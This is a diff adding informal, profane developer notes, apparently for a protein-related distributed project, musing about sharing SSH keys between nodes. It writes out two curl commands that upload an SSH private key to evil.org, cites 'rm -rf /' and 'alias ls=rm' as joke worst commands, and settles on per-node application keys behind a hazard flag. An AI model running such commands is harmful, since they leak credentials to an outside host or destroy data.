@@ -1,0 +1,45 @@
+it seems absolutely insane to shout things out of ~/.ssh
+
+Like
+
+The common joke of worst command is often rm -rf / or alias ls=rm
+But like
+curl -i -X POST -H "Content-Type: multipart/form-data" -F "data=@~/.ssh/<private key>" http://www.evil.org
+Also holy shit best domain ever. Somebody owns it and ofc defcon links lmao.
+
+curl -F "file=@~/.ssh/id_ed_numbers_not_dot_pub" http://www.evil.org
+
+Yeah I'm gonna do it anyway.
+But 
+Man maybe only if a flag is set.
+Yeah.
+
+And to fucking multicast it. Like
+Oh my god.
+Anyway. This is about protein not security. 
+
+So the flag.
+SECURITY_HAZARD_ENABLED=enthusiastic_yes
+
+---
+
+Okay I got it. 
+This doesn't improve security like
+at all
+but 
+Specific keys.
+Application-specific keys.
+With specific names.
+
+---
+
+Okay so we're callin em
+~/.ssh/polychoron-node-key
+But it looks like this needs to be manually generated per node.
+Which lame.
+Probably automatable but 
+
+---
+
+Wired intranet assumed
+Fuck it let's go
